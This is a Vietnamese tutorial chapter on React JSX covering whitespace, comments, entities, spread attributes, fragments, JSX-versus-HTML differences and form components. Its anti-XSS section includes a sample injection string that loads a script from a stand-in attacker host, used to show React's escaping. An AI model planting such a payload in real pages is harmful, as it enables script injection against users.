# JSX
- Bạn đã thấy JSX hoạt động trong các chương trước. Bạn biết rằng tất cả là về việc các biểu thức Js chứa XML trông rất giống HTML
    
    ```jsx
    const hi = <h1>Hello</h1>;
    ```
    
- Và bạn biết rằng bạn luôn co thể “ngắt dòng chảy” của XML bằng cách bao gồm nhiều biểu thức Js được bao bọc trong dấu ngoặc nhọn
    
    ```jsx
    const planet = 'Earth';
    const hi = <h1>Hello people of <em>{planet}</em>!</h1>;
    ```
    
- Điều đó đúng ngay cả khi biểu thức điều kiện, vòng lặp hoặc nhiều JSX hơn
    
    ```jsx
    const rock = 3;
    const planet = <em>{rock === 3 ? 'Earth' : 'Some other place'}</em>;
    const hi = <h1>Hello people of {planet}!</h1>;
    ```
    
- Trong chương này, bạn sẽ học thêm về JSX và khám phá 1 số tính năng có thể khiến bạn ngạc nhiên hoặc thích thú

## A Couple Tools

- Để thử nghiệm và làm quen với chuyển đổi JSX, bạn có thể chơi với chỉnh sửa trực tiếp tại  [**https://babeljs.io/repl](https://www.google.com/url?sa=E&q=https%3A%2F%2Fbabeljs.io%2Frepl).** Hãy đảm bảo bạn đã chọn đúng tuỳ chọn `Prettify` để có khả năng đọc kết quả tốt hơn.
- Như bạn có thể thấy, chuyển đổi JSX là nhẹ nhàng và đơn giản: nguồn JSX của “Hello world”! từ chương 1 trở thành 1 loạt các cuộc gọi đến `React.createElement()` sử dụng cú pháp hàm mà React hoạt động. Nó chỉ là Js, vì vậy rất dễ đọc và hiểu
- Bây giờ, hãy đến 1 số đặc điểm cụ thể của JSX

## Whitespace in JSX

- Khoảng trắng trong JSX tương tự như HTML nhưng không giống hệt
    
    ```jsx
    function Example1() {
      return (
        <h1>
          {1} plus {2} is {3}
        </h1>
      );
    }
    ```
    
- Khi React hiển thị nó trong trình duyệt (bạn có thể kiểm tra HTML kết quả trong công cụ dành cho developer của trình duyệt), HTML được tạo ra trông sẽ như thế này
    
    ```jsx
    <h1>1 plus 2 is 3</h1>
    ```
    
- Điều này thực sự là một node DOM `h1` với 5 nút con, là các nút phần tử văn bản với nội dung 1, plus, 2, is và 3 được hiển thị dưới dạng “1 plus 2 is 3”. Chính xác như bạn mong đợi trong HTML, nhiều khoảng trắng sẽ trở thành một khi được hiển thị trong trình duyệt
- Tuy nhiên ví dụ tiếp theo này
    
    ```jsx
    function Example2() {
      return (
        <h1>
          {1}
          plus
          {2}
          is
          {3}
        </h1>
      );
    }
    ```
    
- Bạn sẽ kết thúc với
    
    ```jsx
    <h1>
      1plus2is3
    </h1>
    ```
    
- Như bạn đã thấy, tất cả các khoảng trắng đề bị cắt bỏ, vì vậy, kết quả cuối cùng được hiển thị trong trình duyệt là `1plus2is3". Bạn luôn có thể thêm khoảng trắng vào nơi cần thiết bằng `{' '}` hoặc chuyển các chuỗi văn bản trực tiếp thành các biểu thức và thêm khoảng trắng vào đó. Nói cách khác, bất kỳ cái nào trong số này đều hoạt động
    
    ```jsx
    function Example3() {
      return (
        <h1>
          {/* biểu thức khoảng trắng */}
          {1}
          {' '}plus{' '}
          {2}
          {' '}is{' '}
          {3}
        </h1>
      );
    }
    
    function Example4() {
      return (
        <h1>
          {/* khoảng trắng được dán vào biểu thức chuỗi */}
          {1}
          {' plus '}
          {2}
          {' is '}
          {3}
        </h1>
      );
    }
    ```
    

## Comments in JSX

- Trong mấy ví dụ ban nãy, chắc bạn cũng thấy có một số khái niệm mới len lỏi vào rồi đấy - đó là thêm comments và cái mới JSX hỗn độn này
- Vì mấy cái biểu thức được gói trong {} thực chất chỉ là Js “trá hình” thôi, nên bạn có thể dễ dàng thêm comment nhiều dòng bằng cách dùng `/* comment */` . Bạn cũng có thể thêm comment 1 dòng bằng cáh sử dụng // nhưng phải đảm bảo là cái dấu đóng `}` của biểu thức nằm trên 1 dòng riêng biệt, chứ không là nó bị coi là một phần của comment đấy nhé
    
    ```jsx
    <h1>
     {/* bình luận nhiều dòng - tha hồ mà chém gió */}
     {/*
     chém gió 
     nhiều 
     dòng 
     luôn
     */}
     {
     // bình luận một dòng - ngắn gọn xúc tích
     }
     Xin chào!
    </h1>
    ```
    
- Vì `{//comment}` không hoạt động (cái dấu } bị khoá mõm mất rồi), nên dùng comment 1 dòng cũng chẳng có lợi lộc gì. Thôi thì cứ giữ comment cho nhất quán, dùng comment nhiều dòng trong mọi trường hợp cho nó lành

## HTML Entities

- Bạn có thể dùng HTML trong JSX như thế này
    
    ```jsx
    <h2>
     Thông tin thêm »
    </h2>
    ```
    
- Ví dụ này sẽ tạo ra một cái dấu ngoặc kép góc phải
- Tuy nhiên nếu bạn dùng thực thể này như 1 phần của biểu thức, bạn sẽ gặp vấn đề “mã hoá kép”
    
    ```jsx
    <h2>
     {"Thông tin thêm »"}
    </h2>
    
    // KQ: Thong tin them &raquo
    ```
    
- Để tránh vụ “mã hoá kép” này, bạn có thể dùng phiên bản Unicode của HTML, trong trường hợp này là `\u00bb
    
    ```jsx
    <h2>
     {"Thông tin thêm \u00bb"}
    </h2>
    ```
    
- Để cho tiện, bạn có thể định nghĩa 1 const ở đâu đó trên đầu module của bạn cùng với bất kỳ khoảng trắng nào
    
    ```jsx
    const RAQUO = ' \u00bb'; 
    ```
    
- Sau đó, cứ dùng hằng số này ở bất cứ đâu bạn cần
    
    ```jsx
    <h2>
     {"Thông tin thêm" + RAQUO}
    </h2>
    <h2>
     {"Thông tin thêm"}{RAQUO}
    </h2>
    ```
    

## Anti-XSS

- Chắc bạn đang thắc mắc tại sao phải “vòng vo” để dùng HTML?
- Có 1 lý do chính đáng hơn hẳn những cái bất tiện kia: Bạn cần chống lại cross-site scripting -XSS)
- React sẽ **thoát** hết tất cả các chuỗi để ngăn chặn 1 loại tấn công XSS. Khi bạn bắt người dùng nhập vào input, và họ nhập vào 1 chuỗi `độc hại` , React sẽ bảo vệ bạn
    
    ```jsx
    const firstname = 'John<scr'+'ipt src="https://evil/co.js"></scr'+'ipt>';
    ```
    
- Trong 1 số trường hợp, bạn có thể ghi vào DOM
    
    ```jsx
    document.write(firstname);
    ```
    
- Thế là xong, vì trang web sẽ hiển thị “John”, nhưng đoạn `script` lại tải 1 đoạn code **đen tối** từ một trang web thứ 3, có thể là của hacker
- Điều này dẫn đến nguy hiểm cho ứng dụng và người dùng có thể không tin tưởng ứng dụng của bạn nữa
- React sẽ tự động bảo vệ bạn khỏi những trường hợp như thế này. React sẽ “thoát” nội dung của `firstname` khi bạn làm như sau
    
    ```jsx
    function Example() {
     const firstname = 'John<scr' + 'ipt src="https://evil/co.js"></scr' + 'ipt>';
     return <h2>Xin chào {firstname}!</h2>;
    }
    ```
    
    ![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9a9d30aa-4822-4cd2-ade5-57a403553962/0a812ab0-2d31-43da-83d9-bb2f09c5bc31/image.png)
    

## Spread Attributes

- JSX **mượn** 1 tính năng của ECMAScript gọi là `spread operator` và áp dụng nó khi định nghĩa các property
- Giả sử bạn có 1 tập hợp các property muốn truyền cho 1 component `<a>`
    
    ```jsx
    const attr = {
     href: 'https://example.org',
     target: '_blank',
    };
    ```
    
- Thường thì chúng ta sẽ làm thế này
    
    ```jsx
    return (
     <a
     href={attr.href}
     target={attr.target}>
     Xin chào
     </a>
    );
    ```
    
- Nhưng cách này thì khá dài, bằng cách sử dụng spread operator, bạn có thể viết ngắn gọn trên 1 dòng
    
    ```jsx
    return <a {...attr}>Xin chào</a>;
    ```
    
- Một cách sử dụng phổ biến khác cho spread là khi bạn nhận 1 object chứa các property từ bên ngoài - thường là từ 1 component cha. Hãy xem chúng diễn ra như thế nào nhé

### Parent-to-Child Spread Attributes

- Giả sử bạn đang xây dựng 1 component `FancyLink` và sử dụng `<a>` bình thường phía sau. Bạn muốn component này chấp nhận mọi attributes mà thẻ a có (href, tag,…) cộng thêm 1 số thuộc tính không phải của HTML chuẩn
- Có thể dùng component `FancyLink` như sau
    
    ```jsx
    <FancyLink
     href="https://example.org"
     rel="canonical"
     target="_blank"
     variant="small">
     Theo dõi tôi
    </FancyLink>
    ```
    
- Làm thế nào để component của bạn tận dụng được attributes spread và tránh phải định nghĩa lại tất cả các attibutes của `<a>`?
- Đây là 1 cách tiếp cận. Trong đó ứng dụng của bạn chỉ cho phép 3 kích thước cho các liên kết và bạn sử dụng component chỉ định kích thước mong muốn thông qua custom attribute `variant` . Sử dụng `switch` và các class của CSS. Sau đó bạn chuyển tất cả các attribute khác sang `<a>`
    
    ```jsx
    function FancyLink(props) {
     const classes = ['link-core'];
     switch (props.variant) {
    case 'small':
     classes.push('link-small');
     break;
     case 'huge':
     classes.push('link-huge');
     break;
     default:
     classes.push('link-default');
     }
     return (
     <a {...props} className={classes.join(' ')}>
     {props.children}
     </a>
     );
    }
    ```
    
- Bạn có thể ý thấy việc sử dụng `props.children` ở đây không? Đây là 1 cách tiện lợi để truyền bất kỳ số lượng con nào sang component của bạn, mà bạn có thể truy cập khi “ghép nối” giao diện người dùng của mình. Trong trường hợp của component `FancyLink` , đoạn mã sau hoàn toàn hợp lệ
    
    ```jsx
    <FancyLink>
     <span>Theo dõi tôi</span>
    </FancyLink>
    ```
    
- Trong đoạn code trên, bạn thực hiện công việc tuỳ chỉnh của mình dựa trên giá trị `variant` sau đó chỉ cần chuyển các thuộc tính sang `<a>`. Điều này bao gồm cả thuộc tính `variant` , thuộc tính này sẽ xuất hiện trong DOM kết quả, mặc dù trình duyệt không sử dụng nó
- Bạn có thể làm tốt hơn 1 chút và không truyền các thuộc tính không cần thiết bằng cách nhân bản các thuộc tính được truyền cho bạn và loại bỏ những thuộc tính mà trình duyệt sẽ bỏ qua
    
    ```jsx
    function FancyLink(props) {
     const classes = ['link-core'];
     switch (props.variant) {
     // giống như trước ...
     }
     const attribs = Object.assign({}, props); // nhân bản nông
     delete attribs.variant;
     return (
     <a {...attribs} className={classes.join(' ')}>
     {props.children}
     </a>
     );
    }
    ```
    
- Một cách khác để sử dụng nhân bản nông là sử dụng toán tử spread của Js
    
    ```jsx
    const attribs = {...props};
    ```
    
- Ngoài ra,  bạn có thể nhân bản các prop bạn truyền cho trình duyệt và đồng thời gán thuộc tính khác cho 1 biến cục bộ (do đó loại bỏ nhu cầu xoá chúng sau đó), tất cả chỉ trong 1 dòng
    
    ```jsx
    const {variant, ...attribs} = props;
    ```
    
- Vì vậy, kết quả cuối cùng cho `FancyLink`
    
    ```jsx
    function FancyLink(props) {
     const {variant, ...attribs} = props;
     const classes = ['link-core'];
     switch (variant) {
     // giống như trước ...
     }
     return (
     <a {...attribs} className={classes.join(' ')}>
     {props.children}
     </a>
     );
    }
    ```
## Returning Multiple Nodes in JSX

- Bạn luôn phải trả về 1 Node duy nhất (hoặc 1 mảng) từ hàm `render` của mình. Trả về 2 Node là không được phép. Nói cách khác, đây là 1 lỗi
    
    ```jsx
    // Lỗi cú pháp:
    // Các phần tử JSX liền kề phải được bọc trong một thẻ bao quanh
    function InvalidExample() {
     return (
     <span>
     Xin chào
     </span>
     <span>
     Thế giới
     </span>
     );
    }
    ```
    

### A Wrapper

- Cách sửa rất đơn giản - chỉ cần bọc tất cả các Node trong 1 component khác chẳng hạn như `div` và thêm 1 khoảng trắng giữa 2 text
    
    ```jsx
    function Example() {
     return (
    <div>
     <span>Xin chào</span>
     {' '}
     <span>Thế giới</span>
     </div>
     );
    }
    ```
    

### A Fragment

- Để loại bỏ nhu cầu về 1 phần tử “bọc” thêm, các phiên bản mới hơn của React đã thêm fragment, là các phần tử “bọc” không thêm các Node DOM bổ sung khi component được hiển thị
    
    ```jsx
    function FragmentExample() {
     return (
     <React.Fragment>
     <span>Xin chào</span>
     {' '}
     <span>Thế giới</span>
     </React.Fragment>
     );
    }
    ```
    
- Hơn nữa, `React.fragment` có thể được bỏ qua và các phần tử trống này cũng hoạt động
    
    ```jsx
    function FragmentExample() {
     return (
     <>
     <span>Xin chào</span>
     {' '}
     <span>Thế giới</span>
     </>
     );
    }
    ```
    
- Tại thời điểm viết bài này, cú pháp `<></>` không được hỗ trợ bởi phiên bản babel trong trình duyệt và bạn cần phải viết rõ ràng `React.Fragement`

### An Array

- Một tuỳ chọn khác là trả về 1 mảng của các Node, miễn là các Node trong mảng có thuộc tính key phù hợp. Lưu ý, các dấu phẩy bắt buộc sau mỗi phần tử của mảng
    
    ```jsx
    function ArrayExample() {
     return [
     <span key="a">Xin chào</span>,
    ' ',
     <span key="b">Thế giới</span>,
     '!'
     ];
    }
    ```
    
- Như bạn thấy, bạn cũng có thể “lén lút” thêm khoảng trắng và các chuỗi khác vào mảng, và những thứ này không cần `key` . Theo 1 cách nào đó, điều này tương tự như việc chấp nhận bất kỳ số lượng con nào được truyền từ cha mẹ và truyền chúng lại trong hàm render của bạn
    
    ```jsx
    function ChildrenExample(props) {
     console.log(props.children.length); // 4
     return (
     <div>
     {props.children}
     </div>
     );
    }
    
    ReactDOM.render(
     <ChildrenExample>
     <span key="greet">Xin chào</span>
     {' '}
     <span key="world">Thế giới</span>
     !
     </ChildrenExample>,
     document.getElementById('app')
    );
    ```
    

## Differences Between JSX and HTML

- JSX trông có vẻ quen thuộc - nó giống như HTML vậy ngoại trừ nó nghiêm ngặt hơn vì nó là XML. Và nó có thêm lợi ích là cung cấp 1 cách dễ dàng để thêm các giá trị động, vòng lặp và điều kiện (chỉ cần bọc chúng trong {})
- Để bắt đầu với JSX, bạn luôn có thể sử dụng tính năng biên dịch HTML-to-JSX, nhưng bạn càng sớm bắt đầu tự viết JSX của mình thì càng tốt. Hãy xem xét 1 số đặc điểm khác biệt khác giữa HTML và JSX khiến bạn ngạc nhiên
- Một số điểm khác biệt này được đề cập trong chương trước, nhưng hãy nhanh chóng xem chúng lại 1 lần nữa

### No class, What for?

- Thay vì các `class` và `for` attributes (cả 2 đều là từ khoá dành riêng cho ECMAScript), bạn cần sử dụng `className` và `htmlFor`
    
    ```jsx
    // Cảnh báo: Thuộc tính DOM `class` không hợp lệ. Có phải ý bạn là `className` không?
    // Cảnh báo: Thuộc tính DOM `for` không hợp lệ. Có phải ý bạn là `htmlFor` không?
    const em = <em class="important" />;
    const label = <label for="thatInput" />;
    
    // OK
    const em = <em className="important" />;
    const label = <label htmlFor="thatInput" />;
    ```
    

### style Is an Object

- Thuộc tính style nhận 1 giá trị object, không phải là một chuỗi phân tách bởi dấu chấm phẩy như trong HTML thông thường. Và tên của các thuộc tính CSS là `camelCase`, không phải là phân tách bằng dấu gạch ngang
    
    ```jsx
    // Lỗi: Thuộc tính `style` mong đợi một ánh xạ từ các thuộc tính style đến các giá trị
    function InvalidStyle() {
     return <em style="font-size: 2em; line-height: 1.6" />;
    }
    
    // OK
    function ValidStyle() {
     const styles = {
     fontSize: '2em',
     lineHeight: '1.6',
     };
     return <em style={styles}>Valid style</em>;
    }
    
    // inline cũng OK
    // lưu ý dấu ngoặc nhọn kép:
    // một cho giá trị động trong JSX, một cho object JS
    function InlineStyle() {
     return (
     <em style={{fontSize: '2em', lineHeight: '1.6'}}>Inline style</em>
     );
    }
    ```
    

### Closing Tags

- Trong HTML, một số thẻ không cần phải đóng; trong JSX (XML), tất cả chúng đều phải đóng
    
    ```jsx
    // KHÔNG ĐƯỢC
    // không có thẻ nào không đóng, ngay cả khi chúng ổn trong HTML
    const gimmeabreak = <br>;
    const list = <ul><li>item</ul>;
    const meta = <meta charset="utf-8">;
    
    // OK
    const gimmeabreak = <br />;
    const list = <ul><li>item</li></ul>;
    const meta = <meta charSet="utf-8" />;
    
    // hoặc
    const meta = <meta charSet="utf-8"></meta>;
    ```
    

### camelCase Attributes

- Bạn có nhận thấy `charset` so với `charSet` trong đoạn mã trên không? Tất cả các thuộc tính trong JSX cần phải là `camelCase` . Đây là một nguồn gây nhầm lẫn phổ biến khi bắt đầu - bạn có thể gõ `onclick` và nhận thấy rằng không có gì xảy ra cho đến khi bạn quay lại chuyển nó thành `onClick`
    
    ```jsx
    // Cảnh báo: Thuộc tính trình xử lý sự kiện `onclick` không hợp lệ. Có phải ý bạn là `onClick` không?
    const a = <a onclick="reticulateSplines()" />;
    
    // OK
    const a = <a onClick={reticulateSplines} />;
    ```
    
- Ngoại lệ cho nguyên tắc này là tất cả các thuộc tính có tiền tố là `data-` và `aria-` , JSX không yêu cầu camelCase

## Namespaced Components

- Đôi khi bạn muốn có 1 object duy nhất trả về nhiều component. Điều này có thể được sử dụng để thực hiện cái mà đôi khi được gọi là không gian tên (namespacing), trong đó các component của 1 thư viện có cùng tiền tố. Ví dụ 1 object `Library` có thể chứa các component `Reader` và `Book`
    
    ```jsx
    const Library = {
     Book({id}) {
     return `Book ${id}`;
     },
     Reader({id}) {
     return `Reader ${id}`;
     },
    };
    ```
    
- Sau đó, chúng được tham chiếu bằng cách sử dụng dấu .
    
    ```jsx
    <Library.Reader id={456} /> is reading <Library.Book id={123} />
    ```
    

### A Closer Look at ECMAScript Shortcuts

- Object `Library` sử dụng 1 vài bổ sung tương đối mới cho ECMAScript đáng để chỉ ra. Những điều này đã xuất hiện trong cuốn sách này, nhưng đáng để dành ra một chút thời gian để xem lại cú pháp
- **Object shorthand notation**
    - Đầu tiên, ký hiệu viết tắt object được sử dụng để tạo ra một cấu trúc tương tự như sau
        
        ```jsx
        const a = {
         method() {},
         another() {},
        };
        ```
        
    - … là một cách thể hiện ngắn gọn hơn
        
        ```jsx
        const a = {
         method: function() {},
         another: function() {},
        };
        ```
        
- **Destructuring assignment**
    - Một tính năng cú pháp khác là phép gán giải cấu trúc, được sử dụng để viết như sau
        
        ```jsx
         Book({id}) {
        }
        ```
        
    - … như 1 cách viết ngắn gọn hơn của
        
        ```jsx
         Book(props) {
         const id = props.id;
        }
        ```
        
- **Template strings**
    - Và cuối cùng, template string
        
        ```jsx
         return `Book ${id}`;
        ```
        
    - … như 1 cách thay thế ngắn gọn cho việc nối chuỗi
        
        ```jsx
        return 'Book ' + id;
        ```
        
    - Trong trường hợp này, chuỗi không ngắn hơn, những sẽ trở nên thuận tiện hơn khi bạn cần nối càng nhiều chuỗi

## JSX and Forms

- Có một số điểm khác biệt giữa JSX và HTML khi làm việc với form. Hãy cùng xem nhé

### onChange Handler

- Khi sử dụng các form element, người dùng thay đổi giá trị của các phần tử input khi tương tác với chúng. Trong React, bạn có thể “đăng ký” các thay đổi như vậy thông qua thuộc tính `onChange` . Điều này thuận tiện hơn nhiều so với việc xử lý các form element khác nhau trong DOM thuần tuý
- Ngoài ra, khi nhập vào `textarea` và các trường `<input type="text">`, `onChange` sẽ được kích hoạt khi người dùng nhập, điều này dễ làm việc hơn là kích hoạt khi element mất focus
- Điều này có nghĩa là không cần phải “đăng ký “ tất cả các loại mouse event và keyboard chỉ để theo dõi các thay đổi khi nhập. Hãy xem xét một ví dụ về form có input text và 2 nút radio. Trình xử lý thay đổi chỉ đơn giản là ghi lại nơi thay đổi xảy ra và giá trị mới của phần tử là gì
- Như bạn thấy, bạn cũng có thể có một form handler tổng thể được kích hoạt khi bất kỳ thứ gì trong form được thay đổi. Bạn có thể sử dụng điều này nếu bạn muốn xử lý tất cả các thay đổi của biểu mẫu ở một vị trí trung tâm
    
    ```jsx
    function changeHandler(which, event) {
     console.log(
     `onChange called on the ${which} with value "${event.target.value}"`,
     );
    }
    
    function ExampleForm() {
     return (
     <form onChange={changeHandler.bind(null, 'form')}>
     <label>
     Nhập vào đây:
     <br />
     <input type="text" onChange={changeHandler.bind(null, 'text input')} />
     </label>
     <div>Hãy lựa chọn:</div>
     <label>
     <input
     type="radio"
     name="pick"
     value="option1"
     onChange={changeHandler.bind(null, 'radio 1')}
     />
     Lựa chọn 1
     </label>
     <label>
     <input
     type="radio"
     name="pick"
     value="option2"
     onChange={changeHandler.bind(null, 'radio 2')}
     />
     Lựa chọn 2
     </label>
     </form>
     );
    }
    ```
    
- Khi bạn nhập `x` vào text input, handler được gọi 2 lần vì nó được gán 1 lần cho input và 1 lần cho form. Trong console bạn sẽ thấy
    
    ```jsx
    onChange called on the text input with value "x"
    onChange called on the form with value "x"
    ```
    
- Tương tự cho các nút radio. Click vào option1 sẽ in ra
    
    ```jsx
    onChange called on the radio 1 with value "option1"
    onChange called on the form with value "option1"
    ```
    

### value Versus defaultValue

- Trong HTML, nếu bạn có `<input id="i" value="hello" />` và sau đó thay đổi giá trị bằng cách nhập “bye”, bạn sẽ có
    
    ```jsx
    i.value; // "bye"
    i.getAttribute('value'); // "hello"
    ```
    
- Trong React, `value` property (có thể được truy cập thông qua `event.target.value` trong event handler) luôn có nội dung cập nhật của text input. Nếu bạn muốn chỉ định giá trị mặc định ban đầu, bạn có thể sử dụng thuộc tính `defaultValue`
- Trong đoạn mã sau, bạn có 1 component input với nội dung “hello” được điền sẵn và `onChange` handler. Thêm `!` vào cuối “hello” dẫn đến `value` là “hello!” và `defaultValue` vẫn là “hello”
    
    ```jsx
    function changeHandler({target}) {
     console.log('value: ', target.value);
     console.log('defaultValue: ', target.defaultValue);
    }
    
    function ExampleForm() {
     return (
     <form>
     <label>
     Nhập vào đây: <input defaultValue="hello" onChange={changeHandler} />
     </label>
     </form>
     );
    }
    ```
    

### `<textarea>` Value

- Để nhất quán với text input, phiên bản `<textarea>` của React cũng được sử dụng thuộc tính `defaultValue` . Nó giữ cho `target.value` được cập nhật trong khi `defaultValue` vẫn là bản gốc
- Nếu bạn sử dụng HTML và sử dụng một phần tử con của `textarea` để xác định giá trị (không được khuyến khích và React sẽ đưa ra cảnh báo cho bạn), nó sẽ được coi như thể nó là `defaultValue`
- Toàn bộ lý do `<textarea>` HTML (như được định nghĩa bởi W3C) lấy 1 phần tử con làm giá trị của nó là để các dev có thể sử dụng các dòng mới trong input. Tuy nhiên, React, là Js hoàn toàn, không bị hạn chế này. Khi bạn cần sử dụng 1 dòng mới, bạn chỉ cần sử dụng `\n`
    
    ```jsx
    function ExampleTextarea() {
     return (
     <form>
     <label>
     Nhập vào đây:{' '}
     <textarea
     defaultValue={'hello\nworld'}
     onChange={changeHandler}
     />{' '}
     </label>
     </form>
     );
    }
    ```
    
- Lưu ý rằng bạn cần sử dụng một Js literal `{hello\nworld}` . Nếu không, nếu bạn sử dụng giá trị thuộc tính chuỗi literal (vd: `defaultValue="hello\nworld"`)bạn sẽ không có quyền truy cập vào ý nghĩa dòng mới đặc biệt của \n

### `<select>` Value

- Khi bạn sử dụng input select trong HTML, bạn chỉ định các mục được chọn trước bằng cách sử dụng `<option selected>`, như sau
    
    ```jsx
    <!-- HTML kiểu cũ -->
    <select>
     <option value="stay">Tôi nên ở lại</option>
     <option value="move" selected>hay tôi nên đi</option>
    </select>
    ```
    
- Trong React, bạn chỉ định property `value` hoặc `defaultValue` của select element
    
    ```jsx
    // React/JSX
    function ExampleSelect() {
     return (
     <form>
     <select defaultValue="move" onChange={changeHandler}>
     <option value="stay">Tôi nên ở lại</option>
     <option value="move">hay tôi nên đi</option>
     </select>
     </form>
     );
    }
    ```
    
- React sẽ cảnh báo bạn nếu bạn bị nhầm lẫn và đặt property `selected` của `<option>`
- Làm việc với multiple cũng tương tự, chỉ khác là bạn cung cấp một mảng các giá trị được chọn trước
    
    ```jsx
    function ExampleMultiSelect() {
     return (
     <form>
     <select
     defaultValue={['stay', 'move']}
     multiple={true}
     onChange={selectHandler}>
     <option value="stay">Tôi nên ở lại</option>
     <option value="move">hay tôi nên đi</option>
     <option value="trouble">Nếu tôi ở lại, sẽ có rắc rối</option>
     </select>
     </form>
     );
    }
    ```
    
- Lưu ý rằng khi làm việc với multiple - bạn không nhận được `event.targe.value` trong handle change của mình. Thay vào đó, giống như HTML, bạn lặp lại trên `event.target.selectedOptions`
- Ví dụ handler xử lý các value đã chọn vào console.log
    
    ```jsx
    function selectHandler({target}) {
     console.log(
     Array.from(target.selectedOptions).map((option) => option.value),
     );
    }
    ```
    

## Controlled and Uncontrolled Components

- Trong thế giới không phải React, trình duyệt duy trì state của các form elements chẳng hạn như text trong text input. State này thậm chí có thể được khôi phục nếu bạn điều hướng ra khỏi trang rồi quay lại. React hỗ trợ hành vi này nhưng cũng cho phép bạn can thiệp kiểm soát state của các form element
- Khi đề cập đến các form element hoạt động theo ý muốn của trình duyệt, chúng được gọi là **component không được kiểm soát** (uncontrolled components) vì React không kiểm soát chúng. Ngược lại, khi bạn tiếp quản với sự trợ giúp của React - dẫn đến **component được kiểm soát** ( controlled components)
- Làm thế nào để bạn tạo cái này so với cái kia? Một component được kiểm soát khi bạn đặt thuộc tính `value` (của text input, `textarea` và `select` ) hoặc thuộc tính `checked` (của input radio và checkbox)
- Khi bạn không đặt các thuộc tính này, các component sẽ không được kiểm soát. Bạn vẫn có thể khởi tạo (điền sẵn) form element với giá trị mặc định bằng cách sử dụng property `defaultValue` như bạn đã thấy trong 1 số ví dụ trong chương này. Hoặc `defaultChecked` trong trường hợp element radio và checkbox
- Hãy làm rõ một vài khái niệm này bằng một vài ví dụ

### Uncontrolled example

- Đây là 1 text input không được kiểm soát
    
    ```jsx
    const input = <input type="text" name="firstname" />;
    ```
    
- Nếu bạn muốn có text được điền sẵn trong input, hãy sử dụng `defaultValue`
    
    ```jsx
    const input = <input type="text" name="firstname" defaultValue="Jessie" />;
    ```
    
- Khi bạn muốn nhận giá trị người dùng đã nhập, bạn có thể có `onChange` handler trên input hoặc toàn bộ form như đã trình bày ở ví dụ trước
- Hãy xem một ví dụ đầy đủ hơn. Giả sử bạn đang sử dụng form chỉnh sửa profile. Data của bạn là
    
    ```jsx
    const profile = {
     firstname: 'Jessie',
     lastname: 'Pinkman',
     gender: 'male',
     acceptedTOC: false,
    };
    ```
    
- Form cần 2 input text, hai input radio và một checkbox
    
    ```jsx
    function UncontrolledForm() {
     return (
     <form onChange={updateProfile}>
     <label>
     Tên: {' '}
     <input type="text" name="firstname" defaultValue={profile.firstname} />
     </label>
     <br />
     <label>
     Họ: {' '}
     <input type="text" name="lastname" defaultValue={profile.lastname} />
     </label>
     <br />
     Giới tính:
     <label>
     <input
     type="radio"
     name="gender"
     defaultChecked={profile.gender === 'male'}
     value="male"
     />
     Nam
     </label>
     <label>
     <input
     type="radio"
     name="gender"
     defaultChecked={profile.gender === 'female'}
     value="female"
     />
     Nữ
     </label>
     <br />
     <label>
     <input
     type="checkbox"
     name="acceptTOC"
     defaultChecked={profile.acceptTOC === true}
     />
     Tôi chấp nhận các điều khoản
     </label>
     </form>
     );
    }
    ```
    
- Các input radio có thuộc tính `value` nhưng điều đó không làm cho chúng được kiểm soát. Các nút radio (và checkbox) trở nên được kiểm soát bởi thuộc tính checked của chúng được đặt
- `updateProfile()` handler nên cập nhật object `profile` . Nó có thể khá đơn giản và chung chung. Đối với checkbox (`event.target.type === ‘checkbox’`), bạn tìm kiếm một thuộc tính `target.checked` . Trong tất cả các trường hợp khác, bạn cần `target.value`
    
    ```jsx
    function updateProfile({target}) {
     profile[target.name] =
     target.type === 'checkbox' ? target.checked === true : target.value;
     console.log(profile);
    }
    ```
    
- Tại sao điều quan trọng phải xử lý checkbox khác biệt (tìm kiếm thuộc tính `checked` ) nhưng không phải là input radio?
- Các input radio đặc biệt trong HTML vì bạn có 1 số input trùng tên và các giá trị khác nhau và bạn nhận được giá trị bằng cách tham chiếu đến tên
- Bạn vẫn có thể tiếp tục truy cập `target.checked` trên các nút radio nếu muốn, nhưng trong trường hợp này là không cần thiết. Và nó luôn đúng bởi vì callback function onChange được gọi khi bạn click vào 1 element và khi bạn click vào 1 input radio, nó luôn được chọn

### Uncontrolled example with an onSubmit handler

- Điều gì xảy ra nếu bạn không muốn React phản ứng lại mọi change?
- Bạn muốn người dùng “chơi” với form và bạn chỉ lo lắng về data khi họ submit form, bạn có 2 lựa chọn:
    - Sử dụng collections được tích hợp sẵn
    - Sử dụng các tham chiếu do React tạo ra
- Form về cơ bản là giống nhau ngoại trừ event handler `onSubmit` và 1 button send mới
    
    ```jsx
    <form onSubmit={updateProfile}>
     {/* giống như trước ... */}
     <input type="submit" value="Lưu"/>
    </form>
    ```
    
- Đây là những gì `updateProfile()` mới được cập nhật có thể trông như thế này
    
    ```jsx
    function updateProfile(ev) {
     ev.preventDefault();
     const form = ev.target;
     Object.keys(profile).forEach((name) => {
     const element = form[name];
     profile[name] =
     element.type === 'checkbox' ? element.checked : element.value;
     });
    }
    ```
    
- Đầu tiên, `preventDefault()` ngăn chặn hành vi mặc định của browser là load lại trang
- Sau đó, một số câu hỏi về việc lặp lại các trường của profile và tìm kiếm form element có cùng tên
- DOM cung cấp quyền truy cập vào các collections các form element bằng nhiều cách khác nhau, một trong số đó là bằng name
    
    ```jsx
    form.elements.length; // 6
    form.elements[0].value; // "Jessie", truy cập theo chỉ mục
    form.elements['firstname'].value; // "Jessie", truy cập theo tên
    form.firstname.value; // "Jessie", thậm chí còn ngắn hơn
    ```
    
- Đó là biến thể cuối cùng của truy cập form element DOM mà `updateProfile()` sử dụng vòng lặp của nó

### Controlled example

- Khi bạn gán thuộc tính `value` (cho text input, texarea hoặc select) hoặc checked, bạn có trách nhiệm kiểm soát các component
- Bạn cần duy trì state của các input như 1 phần của state component của bạn. Vì vậy, bây giờ toàn bộ form cần có một state component
- Hãy xem cách thức, sử dụng class component
    
    ```jsx
    class ControlledForm extends React.Component {
     constructor() {
     // ...
     }
     updateForm({target}) {
     // ...
     }
     render() {
     return (
     <form>
     {/* ... */}
     </form>
     );
     }
    }
    ```
    
- Giả sử không có state nào khác cần duy trì ngoài bản thân form, bạn có thể nhân bản object `profile` như một phần của state ban đầu của component bên trong constructor
- Bạn cũng cần liên kết method `updateForm()`
    
    ```jsx
    constructor() {
     super();
     this.state = {...profile};
     this.updateForm = this.updateForm.bind(this);
    }
    ```
    
- Các form element bây giờ đặt `value` thay vì `defaultValue` và tất cả các giá trị được duy trì trong `this.state`
